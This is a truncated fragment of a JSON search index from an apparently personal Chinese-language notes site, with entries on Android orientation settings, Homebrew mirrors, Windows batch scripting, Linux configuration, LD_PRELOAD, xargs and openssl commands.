~ 255 , 如果只用一位 0 ~ F ,\n对应的范围为 0 ~ 15","tags":"操作系统","url":"/yq-docs-operating-system-Android-Some-UI-related-understanding.html","loc":"/yq-docs-operating-system-Android-Some-UI-related-understanding.html"},{"title":"一些XML配置属性","text":"screenOrientation Android应用程序中， android:screenOrientation 用于 控制activity启动时方向 ，也就是横竖屏展示。 下面列出常用的属性值： unspecified，默认值，由系统决定，不同手机可能不一致 landscape，强制横屏显示 portrait，强制竖屏显示 behind，与前一个activity方向相同 sensor，根据物理传感器方向转动，用户90度、180度、270度旋转手机方向，activity都更着变化 sensorLandscape，横屏旋转，一般横屏游戏会这样设置 sensorPortrait，竖屏旋转 nosensor，旋转设备时候，界面不会跟着旋转。初始化界面方向由系统控制 user，用户当前设置的方向 fullSensor 显示的方向（4个方向）是由设备的方向传感器来决定的，\n除了它允许屏幕有4个显示方向之外，其他与设置为\"sensor\"时情况类似，\n不管什么样的设备，通常都会这么做。\n例如，某些设备通常不使用纵向倒转或横向反转，但是使用这个设置，\n还是会发生这样的反转。这个值在API Level 9中引入 fulluser 如果用户锁定了基于传感器的旋转，其行为与 user 相同，\n否则，其行为与 fullSensor 相同，允许所有4种可能的屏幕方\n向。API级别 18中的新增配置。 locked 将方向锁定在其当前的任意旋转方向。API级别 18 中的新增配置。 参考: https://blog.csdn.net/lixiaoliang0723/article/details/105220692","tags":"操作系统","url":"/yq-docs-operating-system-Android-Some-XML-configuration-attributes.html","loc":"/yq-docs-operating-system-Android-Some-XML-configuration-attributes.html"},{"title":"Mac专有指令","text":"codesign convert fc-list gs launchctl md5 otool otfinfo pmset security shasum sips xattr xcrun","tags":"操作系统","url":"/yq-docs-operating-system-Mac-MAC-instruction-index.html","loc":"/yq-docs-operating-system-Mac-MAC-instruction-index.html"},{"title":"Mac环境变量","text":"DYLD_INSERT_LIBRARIES DYLD_PRINT_LIBRARIES","tags":"操作系统","url":"/yq-docs-operating-system-Mac-Mac-environment-variable-index.html","loc":"/yq-docs-operating-system-Mac-Mac-environment-variable-index.html"},{"title":"Mac","text":"Mac指令 Mac环境变量 打印运行时加载的动态库 图标制作 Mac-Vmware磁盘修复 问题 brew 包管理器brew (HomeBrew) 查看配置: brew config 输出: $ brew config\nHOMEBREW_VERSION: 4.1.24\nORIGIN: https://github.com/Homebrew/brew\n... 更换镜像(忽略): # 替换 brew.git\ncd \"$(brew --repo)\"\ngit remote set-url origin https://mirrors.ustc.edu.cn/brew.git\n\n# 替换 homebrew-core.git\n# cd \"$(brew --repo)/Library/Taps/homebrew/homebrew-core\"\n# git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git\n# 新版没有这目录 参考: https://mirrors.tuna.tsinghua.edu.cn/help/homebrew/ 设置环境变量: export HOMEBREW_API_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles/api\"\nexport HOMEBREW_BOTTLE_DOMAIN=\"https://mirrors.tuna.tsinghua.edu.cn/homebrew-bottles\"\nexport HOMEBREW_BREW_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/brew.git\"\nexport HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\"\nexport HOMEBREW_PIP_INDEX_URL=\"https://pypi.tuna.tsinghua.edu.cn/simple\" 针对 macOS 系统上的 Homebrew: # 手动设置\nexport HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\"\n\n# 注：自 brew 4.0 起，大部分 Homebrew 用户无需设置 homebrew/core 和 homebrew/cask 镜像，只需设置 HOMEBREW_API_DOMAIN 即可。\n# 如果需要使用 Homebrew 的开发命令 (如 `brew cat <formula>`)，则仍然需要设置 homebrew/core 和 homebrew/cask 镜像。\n# 请按需执行如下两行命令：\nbrew tap --custom-remote --force-auto-update homebrew/core https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\nbrew tap --custom-remote --force-auto-update homebrew/cask https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask.git\n\n# 除 homebrew/core 和 homebrew/cask 仓库外的 tap 仓库仍然需要设置镜像\nbrew tap --custom-remote --force-auto-update homebrew/cask-fonts https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-fonts.git\nbrew tap --custom-remote --force-auto-update homebrew/cask-versions https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-cask-versions.git\nbrew tap --custom-remote --force-auto-update homebrew/command-not-found https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-command-not-found.git\nbrew tap --custom-remote --force-auto-update homebrew/services https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-services.git\nbrew update\n\n# 或使用下面的几行命令自动设置\nexport HOMEBREW_CORE_GIT_REMOTE=\"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-core.git\"\nfor tap in core cask{,-fonts,-versions} command-not-found services; do\n    brew tap --custom-remote --force-auto-update \"homebrew/${tap}\" \"https://mirrors.tuna.tsinghua.edu.cn/git/homebrew/homebrew-${tap}.git\"\ndone\nbrew update 也可直接使用上面的链接安装.","tags":"操作系统","url":"/yq-docs-operating-system-Mac-index.html","loc":"/yq-docs-operating-system-Mac-index.html"},{"title":"问题","text":"MacApp提权 XCODE多版本 mac一直弹登录项 问题总结","tags":"操作系统","url":"/yq-docs-operating-system-Mac-question-index.html","loc":"/yq-docs-operating-system-Mac-question-index.html"},{"title":"nsis打包","text":"参考文档:: NSIS 打包脚本基础 NSIS（Nullsoft Scriptable Install System）是一个开源的 Windows 系统下安装程序制作程序 大体流程是: 编写 NSIS 脚本(后缀为 nsi 的文件) 编译打包. 默认会打包 NSIS 脚本所在目录的所有文件/目录.\n可使用GUI界面或者: makensis 详情 makensis nsis指令 内置函数 脚本结构 语法规范 常用头文件 一些常见错误 可执行文件选项 一些使用问题、技巧 一些没来得及细看的文: NSIS制作安装包笔记 NSIS使用教程(安装包制作安装文件教程,如何封装打包文件) 中文版 关于NSIS脚本操作静默安装第三方程序+判断电脑位数","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-index.html"},{"title":"nsis","text":"./innosetup构建包 ./nsis","tags":"操作系统","url":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-index.html","loc":"/yq-docs-operating-system-Windows-Windows-execution-file-packaging-index.html"},{"title":"Windows","text":"Windows打开Debian问题 windows_shell windows_shell符号 windows程序打包 windows下关机程序正在运行问题 关于安卓模拟器与WSL冲突 教程","tags":"操作系统","url":"/yq-docs-operating-system-Windows-index.html","loc":"/yq-docs-operating-system-Windows-index.html"},{"title":"windows shell","text":"有一篇总结还可以的: Windows 批处理命令教程（不追求看完，只要求看懂） 变量 与linux使用 $ 不同, windows 使用双 % 引用来表示变量, 如a变量: %a% 批处理有一个变量延迟机制, 可以通过设置 变量延迟拓展(延迟环境变量拓展) 来处理: setlocal enabledelayedexpansion 如: @echo off\nset a=4\nset a=5&echo %a%\npause 的结果是 4 而: @echo off\nsetlocal enabledelayedexpansion\nset a=4\nset a=5&echo !a!\npause 的结果是 5 注解 开启了变量延迟拓展可以按照正常的编码流畅来编码, 不过注意变量定义为使用 两个 ``!`` 包裹 另外,\n在 cmd窗口 中，for之后的形式变量I必须使用单百分号引用，即 %I ;\n而在 批处理文件 中，引用形式变量I必须使用双百分号，即 %% echo 打印变量: echo %APPDATA% 或者使用 @echo , 区别是 加了 @ 不会显示这条命了本身 几种echo: echo off    接下来的命令(不包括当前命令),只打印结果,不打印命令.\n@ECHO OFF   接下来的命令(包括本命令)，只打印执行结果，不打印命令本身\nECHO ON     接下来的命令(不包括本命令)，执行命令前会先把命令打印出来 在批处理文件中，如果命令前加@，表示这条命令不打印出来，只把结果打印出来，即@是关闭命令本身的回显 注释 :: 在批处理中表示注释某一行: :: 这是注释信息 也可以使用 rem, 区别是 rem 支持回显: rem 这是支持回显的注释信息 数值范围 类似于 Python 的 range 吧, 使用: /L  (start,step,end)  step=<end 也叫开关(此处大小写不敏感), 例: setlocal enabledelayedexpansion\n\nfor /l %%1 in (1, 1, 10) do(\n  set \"k=%%1\"\n  echo !k!\n) 获取命令行参数 约定: 获得第i个参数：%i，0<=i && i <=参数最大数量 条件判断 if条件判断, 变量 l 是否已经赋值: if defined l(\n  echo \"已赋值l\"\n)else(\n  echo \"未赋值l\"\n) 支持 not: if not defined xxx 与 或 非的实现: 与(and): if 1==1 if 2==2 echo Ok\n\n:: if 1==1 (if 2==2 echo Ok) 或(or), 这里只谈最便捷的 goto: if \"%1\"==\"\" goto printHelp\nif \"%2\"==\"\" goto printHelp\n\n:printHelp\n  @echo This is a help message, please refere to ... 非(not): if not 1==1 echo OK 循环 for循环, 语法: for 循环条件 do (\n  内容\n) 在cmd窗口中: for %I in (command1) do command2 在批处理文件中: for %%I in (command1) do command2 高级使用 , 寻找指定目录下的文件(不寻找其下子目录), 但是排除指定内容: @echo off\n\nset home=C:\\Users\nset exclude_list=\"_ video music image img.png ttt.py\"\n\nfor /f \"delims=*\" %%i in ('dir /b %home% &#94;| findstr /v /i /x %exclude_list%') do (\n  echo %home%\\\"%%i\"\n  rem rd /s %home%\\\"%%i\"\n) 简单说明, for 中使用 单引号 包裹表示需要执行的指令, 这时管道需要加 &#94; 转义 dir : /b 表示值列出目录/文件 字符串; 可加 /s 递归查找下面所有子目录 findstr : /v 反向匹配; /i 忽略大小写; /x 全词匹配 连接符号 连接符号有: ; & && | || ;   顺序执行多条命令，而不管命令是否执行成功.\n&   与上等同. bash中某条命令后面跟上 &, 用来将命令至于后台执行，避免其占用命令行\n&&  顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令\n|   管道命令\n||  顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令 管道 与 linux 下 | 表示管道一般情况下一致, 但是在 for 循环中需要使用 &#94; 进行 转义 , 即 &#94;| 表示管道 有一种说法解释见: 是不是只有for的('')中的特殊字符前必须要用&#94;对其转义  我看过&#94;不是在要输出特殊字符才用&#94; 大概意思是, 在for循环中, 如果不进行转义, 如: for /f \"delims=*\" %%i in ('dir /b %home% | findstr /v /i /x %exclude_list%') 会把前面的所有, 即: for /f \"delims=*\" %%i in ('dir /b %home% 当成一个指令, 但你又没有这个指令, 所以需要转义. 程序返回码 变量errorlevel: %errorlevel% 可以通过其值判断上一个指令是否正常执行(正常为0). 相当于 linux 的 $? 判断是文件/目录 判断是文件/目录: if exist \"%%i\" (\n    if exist \"%%i\\*\" (\n        echo \"%%i is a folder\"\n    ) else (\n        echo \"%%i is a file\"\n    )\n) 查看帮助信息 查看帮助信息: command /? 路径拼接引号问题 引号介绍: bat脚本中单引号(')是无效的，必须使用双引号(\")来定义字符串。\n在bat脚本中，双引号和空格都需要进行转义处理 定义变量时, 单引号双引号包裹的字符串是不一样的, 不过在bat脚本内部定义时候, 可以不加任何引号表示一个变量 一般单引号只用于 for 循环的时候处理命令; 双引号的话, 举个例子, 如果bat脚本需要传递包含空格的路径参数, 那么为了避免空格把参数分隔, 比如本来是路径是参数1: set app_path=%1 但是由于存在空格, 比如: C:/user/ho me 你又没有在命令行调用时加引号: xxx.bat C:/user/ho me 那么最终获取的参数就是(不带引号): C:/user/ho 而当使用: xxx.bat \"C:/user/ho me\" 得到的结果又为(带引号): \"C:/user/ho me\" 不带引号可能会引起路径丢失的问题, 带引号可能会引起后面参数拼接时候路径不可用问题 带引号时出现问题, 可以从两个方案处理: 方案1: 后面定义的其他部分的路径也加引号 , 如: rem 接受参数的时候就不要加引号了\nset app_path=%1\n\nrem 定义一个带一个引号的路径\nset tmp_path=\"_\"\n\nset new_path=%app_path%\\%tmp_path% 还是以上面的路径为例, 传入的路径为 \"C:/user/ho me\" , 最后的拼接结果为: \"C:/user/ho me\"/\"_\" 这个时候虽存在引号, 但是各部分都是独立的, 可以被系统识别此路径 至于是不是多层独立的引号也可以识别, 感兴趣的可以自己试试: \"\"C:/user/ho me\"\"/\"\"_\"\" 方案二: 去掉所有的引号 , 这个可能会有其他的问题, 如文件如果包含引号怎么处理?\n但是一般人不会这个起名. 去除变量的引号: set var=%var:\"=% 如: set p=\"C:/user/ho me\"/\"_\"\necho %p%\nset p=%p:\"=%\necho %p% 输出: \"C:/user/ho me\"/\"_\"\nC:/user/ho me/_ 对于Windows下路径而言 批处理程序删除自己 一般来说直接删除就行: :: 一些其他代码\ndel %0 但是有时候指令会更新所在路径, 比如: move . tmp\\ 这时候可以利用管道: del %0 | move . tmp\\ 输出重定向 将错误输出, 标准输出重定向到 1.txt 注意顺序不能错 输出重定向: t.bat >1.txt 2>&1 跨盘移动的坑 使用 move 跨盘移动文件夹时, 会报错 拒绝访问 管理员权限也无法. 目前所知的解决方案只有先复制过去然后删除: xcopy /H /E /Y  原有的文件夹 移动到的文件夹\n\nrd /s /q 原有的文件夹 获取绝对路径文件名 如果路径不是传入的参数, 那么需要使用类似函数的方式: @echo off\n\necho 盘符: %~dp0\necho 当前脚本路径: %~dp0\n\necho 参数1盘符: %~dp1\necho 参数1当前脚本路径: %~dp1\necho 参数1文件名称: %~n1\n\nset p1=C:\\Users\\tt\\1.txt\necho %p1%\ncall :get_base_name %p1%\n\ngoto :eof\n\n:get_base_name\n  set file_path=%~dp1\n  echo %file_path%\n  rem 获取到文件名称\n  set file_name=%~n1\n  echo %file_name%\n  rem 获取到文件后缀\n  set suffix=%~x1\n  echo %suffix%\ngoto :eof 获取用户名 code: %username% if与循环 if语句不能包含循环语句, 不过可以使用goto处理: @echo off\n\nset var=hello\nif \"%var%\"==\"hello\" goto loop\ngoto end\n\n:loop\necho doing something...\ngoto loop_end\n\n:loop_end\necho done\ngoto end\n\n:end 指令 ./windows_shell","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell.html","loc":"/yq-docs-operating-system-Windows-windows_shell.html"},{"title":"Windows Shell","text":"assoc attrib call cd certutil color copy del dir exit find findstr for ftype goto if ipconfig mklink mode move net pause popd pushd rmdir set setlocal shift start taskkill tasklist title tskill where wimic xcopy","tags":"操作系统","url":"/yq-docs-operating-system-Windows-windows_shell-index.html","loc":"/yq-docs-operating-system-Windows-windows_shell-index.html"},{"title":"内置函数","text":"dup dup2 fork getcwd wait","tags":"操作系统","url":"/yq-docs-operating-system-linux-Built--in-function-index.html","loc":"/yq-docs-operating-system-linux-Built--in-function-index.html"},{"title":"解释器执行顺序","text":"暂且只谈 Linux 下的 bash/dash, 以及Python. sh脚本, 大多会在文件头定义: #!/bin/bash Python脚本有些也会在文件头定义: #/usr/bin/python3 这些解释器的执行顺序为 文件头定义的解释器, 若定义了上面类型的文件头, 即使是使用时指定, 也无效, 如 bash 1.sh , 还是会使用文件头的定义 实际执行时使用的解释器, 比如 bash 1.sh , 当脚本内没有定义这样的文件头时, 使用执行时指定的 bash 虚拟系统环境默认解释器 (直接使用文件执行, 仅限于Python, 文件需有可执行权限), 如 ./1.py 系统环境默认解释器 (直接使用文件执行, 文件需有可执行权限), 如 ./1.sh","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html","loc":"/yq-docs-operating-system-linux-Conceptual-Interpreter-execution-order.html"},{"title":"概念性","text":"linux删除机制 IO模型 elf文件 终端 tty console区别 Linux系统的启动过程 linux系统环境加载顺序 linux系统信号 linux下文件权限位 sudo与su的部分说明 指令export、env、set三者的区别 重定向 制表符 颜色表与代码表 特殊的权限位 shell类型 shell括号 fstab 文件系统详解 特殊符号 解释器执行顺序","tags":"操作系统","url":"/yq-docs-operating-system-linux-Conceptual-index.html","loc":"/yq-docs-operating-system-linux-Conceptual-index.html"},{"title":"配置文件","text":"有些东西时间一长就忘了, 想半天也不一定能想起来,\n故还是记录一下吧. /etc/hosts 查看本地域名与地址映射, 内容为 地址与域名的映射, 参见: etc-hosts /etc/resolv.conf 配置本机使用dns服务器, 以nameserver开头, 可多行. 参见: etc-resolv-conf /etc/hostname 设置当前主机名, 可通过 hostnamectl 修改, 重启生效 etc-hosts etc-resolv-conf bash的配置文件 持久保存用户配置 profile类 为交互式登陆用户提供配置 功能：设定环境变量，运行命令或脚本: /etc/profile    #全局\n/etc/profile.d/*.sh   #全局\n~/.bash_profile    #个人配置，当前用户有效 bashrc类 非交互式登陆用户提供配置 功能：设定本地变量，定义命令别名: /etc/bashrc     #全局\n~/.bashrc     #个人 /etc/skel 在建立新用户时，用于初始化用户根目录。 新建用户时, 系统会将此目录下的所有文件、目录都复制到新建用户的根目录，\n并且将用户属主与用户组调整为与此根目录相同。\n所以可将用户配置文件预置到 /etc/skel 目录\n下，比如说 .bashrc 、 .profile 与 .vimrc 等。 注解 如果在新建用户时，没有自动建立用户根目录，则无法调用到此框架目录。 如果不想以默认的 /etc/skel 目录作为框架目录，可以在运行 useradd 命令时指定新的框架目录。\n例如: sudo useradd -d /home/chen -m -k /etc/my_skel chen 上述命令将新建用户chen，设置用户根目录为/home/chen，并且此目录会自动建立；同时指定框架目录为/etc/my_skel。 如果不想在每次新建用户时，都重新指定新的框架目录，可以通过修改/etc/default/useradd配置文件来改变默认的框架目录，\n方法如下： 查找SKEL变量的定义，如果此变量的定义已被注释掉，可以取消注释，然后修改其值 SKEL=/etc/my_skel 参考: https://blog.csdn.net/chenzhengfeng/article/details/77381677","tags":"操作系统","url":"/yq-docs-operating-system-linux-Configuration-file-index.html","loc":"/yq-docs-operating-system-linux-Configuration-file-index.html"},{"title":"LD_PRELOAD","text":"可以用来执行程序运行前首先加载的动态库,\n多个使用冒号分割,\n与Mac的 DYLD_INSERT_LIBRARIES 基本一致 用例: 实战-Ubuntu16下Hook系统的open LD_PRELOAD指定的动态库如果与其他的动态库有同名函数,\n则会覆盖掉后者的调用 可以使用 dlsym 来自己重调用后续的同名函数: dlsym(RTLD_NEXT,\"函数名\"); 注解 dlsym 的头文件是 <dlfcn.h> ,\n依赖于: libdl.so 如果没有需要先安装: apt install libc6-dev 编译的时候如果找不到: gcc -ldl ...","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html","loc":"/yq-docs-operating-system-linux-Linux-environment-variable-Ld_preload.html"},{"title":"Linux环境变量","text":"LD_PRELOAD DISPLAY PS1 TMPDIR 本地化（locale）环境变量 对于程序的字符类型处理和区域设置有重要影响 LC_CTYPE LC_CTYPE 代表\"Language Code Type\"，它控制程序如何解释和处理字符。\n这包括字符的大小写转换、字符分类（如字母、数字、空格等）、字符编码和解码等。 LC_CTYPE 的值会影响程序对字符的处理方式，包括字符大小写转换、字符分类、字符编码和解码等。\n例如，当程序需要将大写字母转换为小写字母时，它会参考 LC_CTYPE 变量设置的区域设置来确定如何进行转换。 LC_CTYPE 的常见设置包括： en_US.UTF-8：表示使用美国英语的字符类型，并使用UTF-8编码。 zh_CN.UTF-8：表示使用简体中文的字符类型，并使用UTF-8编码。 更改LC_CTYPE设置可以通过在shell中使用 export LC_CTYPE=<locale> 命令来完成，或者在程序中使用 setlocale 函数。 LC_COLLATE LC_COLLATE 代表\"Language Code Collate\"，它定义了字符的排序和比较规则。\n这决定了字符串如何进行排序，以及在比较操作中字符的顺序。 例如，某些语言中字符\"ä\"可能排在\"z\"之前，而在其他语言中可能不是这样。 LC_COLLATE 的设置通常与 LC_CTYPE 相对应，以确保字符的解释和排序规则一致。\n例如， en_US.UTF-8 区域设置通常会有一个对应的 en_US.UTF-8 的 LC_COLLATE 设置。\n更改 LC_COLLATE 设置可以通过在 shell 中使用 export LC_COLLATE=<locale> 命令来完成，或者在程序中使用 setlocale 函数。 注解 当设置 export LC_COLLATE = 'C' export LC_CTYPE = 'C' 表示使用默认的C语言标准定义的字符排序和比较规则环境，即美国英语环境.","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-environment-variable-index.html","loc":"/yq-docs-operating-system-linux-Linux-environment-variable-index.html"},{"title":"xargs","text":"xargs 命令 是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。\n它擅长将标准输入数据转换成命令行参数，xargs 能够处理管道或者 stdin 并将其转换成特定命令的命令参数。\nxargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。\nxargs 的默认命令是 echo，空格是默认定界符。\n这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。\nxargs 是构建单行命令的重要组件之一。 xargs（英文全拼： eXtended ARGuments）是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。 xargs 可以将管道或标准输入（stdin）数据转换成命令行参数，也能够从文件的输出中读取数据。 xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs 默认的命令是 echo，这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。 xargs 是一个强有力的命令，它能够捕获一个命令的输出，然后传递给另外一个命令。 之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数，\n而日常工作中有有这个必要，所以就有了 xargs 命令，例如: find /sbin -perm +700 |ls -l          # 这个命令是错误的\nfind /sbin -perm +700 |xargs ls -l    # 这样才是正确的 参数选项 -n <num> 指定每行num个输出，默认是无限制 -d <xxx> 以xxx为分隔符 -a <file> 从文件中读入作为stdin -e <flag> 注意有的时候可能会是-E，flag必须是一个以空格分隔的标志，当xargs分析到含有flag这个标志的时候就停止。 -p 当每次执行一个argument的时候询问一次用户(询问时, 必须手动输入y, 才会执行) -t 表示先打印命令，然后再执行。 -i , -I 得看linux支持了，将xargs的每项名称，一般是一行一行赋值给 {}，可以用 {} 代替。 -r no-run-if-empty, 当xargs的输入为空的时候则停止xargs，不用再去执行了。 -s <num> 命令行的最大字符数，指的是 xargs 后面那个命令的最大命令行字符数。 -l 将输入分段，一次执行一行，这样可以避免参数列表过长而导致命令行过长的问题 -L <num> 从标准输入一次读取 num 行送给 command 命令。 -x exit的意思，主要是配合-s使用。 -P 修改最大的进程数，默认是1，为0时候为as many as it can ，这个例子我没有想到，应该平时都用不到的吧 xargs 结合 find 使用 用 rm 删除太多的文件时候，可能得到一个错误信息: /bin/rm Argument list too long. 用 xargs 去避免这个问题: find . -type f -name \"*.log\" -print0 | xargs -0 rm -f xargs -0 将 \\0 作为定界符。 用例, 找apk包并复制到文件夹apks: find ./ -name \"*.apk\" 2>/dev/null | xargs -t -I \"{}\" cp \"{}\" apks 再比如MacOS下查找当前目录的rst文档名: ls *.rst | xargs -L1  | cut -d. -f 1","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-XARGS.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-XARGS.html"},{"title":"Linux指令","text":"7z adjtimex alias apt-cache apt-get apt ar arp asciinema at ausearch awk base64 basename bash bg blkid bzip2 cal cat cd chage chattr chgrp chkconfig chmod chown chpasswd chroot cifsiostat clear cmp col command convert cp crond curl cut dd debbuild debmake df diff dirname dos2unix dpkg-deb dpkg du echo edquota env eval exec expand expect export expr fdisk fg file find flock free fuser g++ gcc gdb genisoimage getfacle getfattr getopt gnome-terminal grep groupadd gunzip gzip halt hash head history host iconv(mac) ifcofig ifstat init inotifywait insmod iostat iotop ip iptables-restore iptables-save iptables jobs join journalctl kill killall ld ldconfig ldd ln locale-gen locale lpr ls lsb_release lsblk lsmod lsof lszrz mail man mkdir mkfifo modinfo modprobe more mount mpsat mv mydumper myloader netstat nload nm nmcli nohub nohup nslookup ntpdate ntpq objdump od open openssl otool(mac) pandoc parted partprobe passwd paste patch pgrep pidstat ping pkexec pkill poweroff pr printf ps pv pwck pwd qemu-img read readelf readlink reboot rename resize2fs resolvconf rmmod route rsync runlevel rz sar scp script sed seq service set setfacle setfattr shutdown smartctl sort ss ssh-keygen ssh stat stdbuf strings su sudo sync sysstat工具包 systemctl sz tac tail tapstat tar taskset tcpdump tcping tee telnet test time top touch tput tr traceroute trap ttygif ttyrec ulimit umask umount unalias uname uniq unset unzip update-alternatives update-desktop-database uptime useradd userdel vmstat w wall watch wc wget whereis which who whoami wireshark wrk xargs xz yes zenity zip","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-index.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-index.html"},{"title":"openssl","text":"常用指令可见: https://www.gy328.com/ref/docs/openssl.html 若无法访问可见: OpenSSL参考手册 </resources/pdf/OpenSSL 参考手册 & openssl 快速入门 - 菜鸟教程.pdf> 官网: https://www.openssl.org 强大的安全套接字层密码库, 利用它的随机功能来生成可以用作密码的随机字母字符串: openssl rand -base64 10\n# nU9LlHO5nsuUvw==\n\n# standard 标准\n# digest 消化 摘要\n# cipher 加密 OpenSSL有两种运行模式：交互模式和批处理模式。 直接输入openssl回车进入交互模式，输入带命令选项的openssl进入批处理模式。 OpenSSL整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL协议库以及应用程序。OpenSSL的目录结构自然也是围绕这三个功能部分进行规划的。 对称加密算法 OpenSSL一共提供了8种对称加密算法，其中7种是分组加密算法，仅有的一种流加密算法是RC4。这7种分组加密算法分别是AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是128位，其它算法使用的则是64位。事实上，DES算法里面不仅仅是常用的DES算法，还支持三个密钥和两个密钥3DES算法。 非对称加密算法 OpenSSL一共实现了4种非对称加密算法，包括DH算法、RSA算法、DSA算法和椭圆曲线算法（EC）。DH算法一般用户密钥交换。RSA算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA算法则一般只用于数字签名。 信息摘要算法 OpenSSL实现了5种信息摘要算法，分别是MD2、MD5、MDC2、SHA（SHA1）和RIPEMD。SHA算法事实上包括了SHA和SHA1两种信息摘要算法，此外，OpenSSL还实现了DSS标准中规定的两种信息摘要算法DSS和DSS1。 密钥和证书管理 密钥和证书管理是PKI的一个重要组成部分，OpenSSL为之提供了丰富的功能，支持多种标准。 首先，OpenSSL实现了ASN.1的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及CRL等数据对象的DER、PEM和BASE64的编解码功能。OpenSSL提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的DER编解码功能。并实现了私钥的PKCS#12和PKCS#8的编解码功能。OpenSSL在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 在此基础上，OpenSSL实现了对证书的X.509标准编解码、PKCS#12格式的编解码以及PKCS#7的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 事实上，OpenSSL提供的CA应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。 <openssl用法详解> https://www.cnblogs.com/yangxiaolan/p/6256838.html 使用openssl生成密码: ┌──(yanque㉿3675b5ebb8ce)-[~/test]\n└─$ openssl passwd -1 -salt admin 123456\n$1$admin$LClYcRe.ee8dQwgrFc5nz. 其中: passwd 表示生成密码\n-1 表示使用md5算法\n-salt 表示随机使用一个字符串加盐\nadmin 用户名明文\n123456 用户密码明文 命令说明 req:生成证书签名请求(CSR)。用于申请证书。 x509:X.509证书格式相关操作。如签名CSR生成证书、签名其他证书等。 genrsa:生成RSA私钥和公钥。 举个例子: # 生成2048位RSA私钥\nopenssl genrsa -out key.pem 2048\n\n# 生成CSR\nopenssl req -out csr.pem -newkey rsa:2048 -nodes -keyout key.pem\n\n# 使用CA证书和私钥签名CSR生成证书\nopenssl x509 -req -in csr.pem -CA ca.crt -CAkey ca.key -out cert.pem 通用选项: -i n 从哪个文件读取输入, 比如 server.key -o ut 指定将结果输出到文件 genrsa 生成RSA私钥和公钥 -d es3 指定使用des3算法 -a es256 使用aes256对密钥文件进行对称加密 rsa -p ubout 当需要根据私钥生成公钥时, 使用此选项 -a es256 使用aes256对密钥文件进行对称加密 req 请求生成证书签名请求文件 -n ew 指定新生成证书签名请求文件 -k ey 指定签名时, 使用的私钥, 如server.key -k eyout 直接一步生成证书或证书请求与密钥时, 使用此选项指定密钥名称 -n odes 指定密钥文件不加密 -p assout 若需要加密, 命令行指定密码, 格式: pass:密码 , 否则可在交互式界面手动输入 -n ewkey 指定算法, 格式: <algorithm>:<bits> ,\n即 <算法>:<长度> , 若不指定加密方式encryption,\n私钥将以明文保存, 所以通常会使用如aes256的对称加密算法进行私钥的加密, 提高安全性.\n如: rsa:3048, ec:2048. 其他: -x509       直接使用该CSR生成自签名证书, 而不需要第三方CA签名(-out的结果就是证书) ca 作为ca机构对 证书签名请求文件 进行签名 -c ert 使用的证书 -k eyfile 使用的私钥 x509 X.509证书格式相关操作。如签名CSR生成证书、签名其他证书等。 -C Aform 指定证书格式 -C A ca机构所使用的证书, 需要为PEM格式, 否则需用-CAform指定格式 -C Akeyform 指定密钥格式 -C Akey ca机构所使用的私钥, 需要为PEM格式, 否则需用-CAkeyform指定格式 -d ays 指定证书有效期 -s ignkey 自签名时, 使用此选项指定ca密钥 -t ext 输出证书信息 -n oout 不输出证书, 一般与 -text一起使用 -C Acreateserial 在签发新证书时自动创建证书序列号文件\n为了简化 OpenSSL 中证书签发流程,自动完成序列号文件的创建\n(在ubuntu上测试时srl后缀的文件) 例如查看证书信息: openssl x509 -in xxx.crt -text -noout version 查看版本及相关信息 如linux查看openssl安装目录(不适用mac): openssl version -a | grep OPENSSLDIR 用例: Mac 上制作 SSL 证书 背景: 搭建burpsuite服务时，可选使用证书 环境: MacOS 12.5, openssl 